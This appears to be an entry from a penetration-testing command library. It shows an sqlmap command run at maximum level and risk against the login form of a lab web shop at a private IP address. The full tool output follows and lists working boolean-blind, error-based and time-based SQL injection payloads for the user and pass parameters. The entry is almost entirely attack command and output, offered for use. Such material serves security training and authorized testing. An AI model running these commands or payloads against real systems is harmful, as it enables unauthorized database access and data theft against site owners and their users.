---
id: 38749ef2-cc64-4662-b449-27bda74cbe6c
name: SQLMap to Perform SQL Injection With Intense Level
type: command
executor: ''
data: sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo@vcart.com&pass=demo&selop=2'
  --level=5 --risk=3
output: "        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.2.7#stable}\n|_ -|\
  \ . [.]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 21:34:15\n\n\
  [21:34:16] [INFO] resuming back-end DBMS 'mysql' \n[21:34:16] [INFO] testing connection\
  \ to the target URL\nsqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'.\
  \ Do you want to follow? [Y/n] y\nredirect is a result of a POST request. Do you\
  \ want to resend original POST data to a new location? [Y/n] y\nsqlmap resumed the\
  \ following injection point(s) from stored session:\n---\nParameter: user (POST)\n\
  \    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING\
  \ clause\n    Payload: user=demo@vcart.com' AND 4501=4501 AND 'FDuX'='FDuX&pass=demo&selop=2\n\
  \n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING,\
  \ ORDER BY or GROUP BY clause (FLOOR)\n    Payload: user=demo@vcart.com' AND (SELECT\
  \ 2109 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(2109=2109,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x\
  \ FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CniM'='CniM&pass=demo&selop=2\n\
  \n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n\
  \    Payload: user=demo@vcart.com' AND SLEEP(5) AND 'ZNQd'='ZNQd&pass=demo&selop=2\n\
  \nParameter: pass (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based\
  \ blind - WHERE or HAVING clause\n    Payload: user=demo@vcart.com&pass=demo' AND\
  \ 2948=2948 AND 'YLTi'='YLTi&selop=2\n\n    Type: error-based\n    Title: MySQL\
  \ >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n\
  \    Payload: user=demo@vcart.com&pass=demo' AND (SELECT 9195 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT\
  \ (ELT(9195=9195,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS\
  \ GROUP BY x)a) AND 'inPR'='inPR&selop=2\n\n    Type: AND/OR time-based blind\n\
  \    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: user=demo@vcart.com&pass=demo'\
  \ AND SLEEP(5) AND 'QOIf'='QOIf&selop=2\n---\nthere were multiple injection points,\
  \ please select the one to use for following injections:\n[0] place: POST, parameter:\
  \ pass, type: Single quoted string (default)\n[1] place: POST, parameter: user,\
  \ type: Single quoted string\n[q] Quit\n> 0\n[21:34:27] [INFO] the back-end DBMS\
  \ is MySQL\nweb application technology: Apache 2.4.41, PHP 7.1.32\nback-end DBMS:\
  \ MySQL >= 5.0\n[21:34:27] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.10'\n\
  \n[*] shutting down at 21:34:27\n"
created_at: '2020-09-02T18:08:36.743522+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap to Perform SQL Injection With Intense Level

```bash
sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo@vcart.com&pass=demo&selop=2' --level=5 --risk=3
```

## Expected Output

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:34:15

[21:34:16] [INFO] resuming back-end DBMS 'mysql' 
[21:34:16] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=demo@vcart.com' AND 4501=4501 AND 'FDuX'='FDuX&pass=demo&selop=2

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=demo@vcart.com' AND (SELECT 2109 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(2109=2109,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CniM'='CniM&pass=demo&selop=2

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=demo@vcart.com' AND SLEEP(5) AND 'ZNQd'='ZNQd&pass=demo&selop=2

Parameter: pass (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=demo@vcart.com&pass=demo' AND 2948=2948 AND 'YLTi'='YLTi&selop=2

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=demo@vcart.com&pass=demo' AND (SELECT 9195 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(9195=9195,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'inPR'='inPR&selop=2

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=demo@vcart.com&pass=demo' AND SLEEP(5) AND 'QOIf'='QOIf&selop=2
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: pass, type: Single quoted string (default)
[1] place: POST, parameter: user, type: Single quoted string
[q] Quit
> 0
[21:34:27] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0
[21:34:27] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.10'

[*] shutting down at 21:34:27

```
